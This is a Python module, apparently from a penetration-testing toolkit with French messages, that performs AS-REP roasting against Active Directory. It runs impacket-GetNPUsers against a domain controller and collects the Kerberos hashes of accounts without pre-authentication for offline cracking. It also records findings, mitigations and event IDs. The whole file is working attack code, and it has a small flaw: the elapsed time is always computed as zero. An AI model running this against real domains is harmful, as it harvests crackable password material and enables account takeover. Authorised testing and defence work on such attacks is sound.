"""
Red Team — AS-REP Roasting
===========================
Exploits Active Directory accounts with Kerberos pre-authentication disabled.

These accounts are vulnerable because they respond to AS requests without
requiring a valid credential, returning a TGT encrypted with the account's
password. The hash can be cracked offline.

Uses: impacket-GetNPUsers (from impacket)
"""

import subprocess
import os
from datetime import datetime

from utils.format_utils import print_info, print_success, print_warning, print_error


def run_attack(target: str = None, domain: str = "domain.local", user: str = None,
               password: str = None, **kwargs) -> dict:
    """
    Find and exploit AS-REP roastable accounts.

    Uses GetNPUsers to enumerate accounts with pre-authentication disabled,
    then extracts their TGT hashes for offline cracking.
    """
    if not target or not domain:
        return _error("Paramètres 'target' et 'domain' requis.")

    print_warning(f"[RED TEAM] AS-REP Roasting → {target}")
    print_info(f"  Domain: {domain}")
    
    findings = []
    roastable_accounts = []
    
    # Step 1: Enumerate AS-REP roastable accounts
    print_info(f"Énumération des comptes sans pré-auth Kerberos...")
    
    try:
        # Use GetNPUsers to find accounts with pre-auth disabled
        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{user}:{password}",
            "-dc-ip", target,
            "-request",
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode != 0:
            print_warning(f"GetNPUsers failed: {result.stderr[:200]}")
            # Still continue — may have found some accounts before failure
        
        # Parse output for hashes
        hashes = _parse_getnpusers_output(result.stdout)
        
        if hashes:
            print_success(f"  ✓ {len(hashes)} AS-REP roastable account(s) found")
            roastable_accounts = hashes
            findings.append({
                "risk":        "Élevé",
                "title":       f"{len(hashes)} AS-REP roastable account(s)",
                "description": "Comptes : " + ", ".join([h["username"] for h in hashes[:5]]),
                "mitigation":  "Activer la pré-authentification Kerberos sur tous les comptes utilisateur.",
                "event_ids":   [4768],
            })
        else:
            print_info("  → Aucun compte AS-REP roastable détecté.")
            findings.append({
                "risk":        "Info",
                "title":       "Aucun compte AS-REP roastable",
                "description": "Tous les comptes testés ont la pré-authentification Kerberos activée.",
                "mitigation":  "Maintenir cette configuration.",
                "event_ids":   [],
            })
        
        return {
            "module":       "red_team.asrep_roasting",
            "status":       "success" if roastable_accounts else "info",
            "elapsed_s":    (datetime.now() - datetime.now()).total_seconds(),
            "timestamp":    datetime.now().isoformat(),
            "findings":     findings,
            "artifacts": {
                "roastable_accounts": roastable_accounts,
            },
            "summary": {
                "total_roastable": len(roastable_accounts),
            }
        }
    
    except FileNotFoundError:
        return _error("impacket-GetNPUsers not found. Install: pip install impacket")
    except subprocess.TimeoutExpired:
        return _error("GetNPUsers timeout — target unreachable or too slow.")
    except Exception as e:
        return _error(f"AS-REP roasting error: {str(e)}")


def _parse_getnpusers_output(output: str) -> list:
    """
    Parse GetNPUsers output for hashes.
    
    Output format:
        [*] User: username  Downgraded: False
        $krb5asrep$23$username@DOMAIN.LOCAL:hash...
    """
    hashes = []
    lines = output.split("\n")
    
    for line in lines:
        if line.startswith("$krb5asrep$"):
            # Extract username from hash (format: $krb5asrep$23$username@domain:...)
            try:
                parts = line.split("$")
                user_domain = parts[3].split("@")[0]  # Everything before @
                hashes.append({
                    "username": user_domain,
                    "hash":     line,
                    "type":     "AS-REP",
                })
            except Exception:
                pass
    
    return hashes


def _error(message: str) -> dict:
    """Build an error result."""
    print_error(message)
    return {
        "module":   "red_team.asrep_roasting",
        "status":   "error",
        "message":  message,
        "findings": [{
            "risk":        "Élevé",
            "title":       "AS-REP Roasting échoué",
            "description": message,
            "mitigation":  "Vérifier les credentials et la connectivité.",
            "event_ids":   [],
        }],
        "artifacts": {"roastable_accounts": []},
    }
